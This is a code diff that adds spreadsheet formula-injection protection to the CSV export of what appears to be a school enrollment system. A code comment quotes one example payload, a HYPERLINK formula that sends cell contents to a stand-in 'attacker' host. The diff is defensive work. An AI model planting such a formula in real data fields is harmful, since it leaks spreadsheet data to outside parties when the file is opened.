@@ -264,6 +264,32 @@ export async function generateEnrollmentSummary(req: Request) {
   return summary;
 }
 
+/**
+ * Neutralize spreadsheet formula injection (CWE-1236).
+ *
+ * These CSVs carry free text that people type in — names, addresses, remarks.
+ * Excel and LibreOffice execute any cell whose text begins with =, +, -, @, tab
+ * or CR, so a student saved as =HYPERLINK("http://attacker/"&A1,"Click") becomes
+ * a live formula the moment an admin opens the export. Prefixing with an
+ * apostrophe is the standard mitigation: the cell displays, and re-imports, as
+ * literal text.
+ *
+ * A leading + or - on an otherwise plain number (phone numbers such as
+ * +9779800000000, negative amounts) is left alone — those are values, not
+ * formulas, and rewriting them would corrupt the government IEMIS import.
+ */
+function neutralizeCsvFormula(value: string): string {
+  if (!value) return value;
+  const first = value[0]!;
+  if (first === "=" || first === "@" || first === "\t" || first === "\r") {
+    return `'${value}`;
+  }
+  if ((first === "+" || first === "-") && !/^[+-][\d.,\s]*$/.test(value)) {
+    return `'${value}`;
+  }
+  return value;
+}
+
 /** CSV helper with proper escaping */
 export function toCsv(rows: any[]): string {
   if (!rows.length) return "";
@@ -273,8 +299,11 @@ export function toCsv(rows: any[]): string {
   for (const row of rows) {
     const values = headers.map((header) => {
       let val = row[header] ?? "";
-      if (typeof val === "string" && (val.includes(",") || val.includes('"') || val.includes("\n"))) {
-        val = `"${val.replace(/"/g, '""')}"`;
+      if (typeof val === "string") {
+        val = neutralizeCsvFormula(val);
+        if (val.includes(",") || val.includes('"') || val.includes("\n")) {
+          val = `"${val.replace(/"/g, '""')}"`;
+        }
       }
       return val;
     });
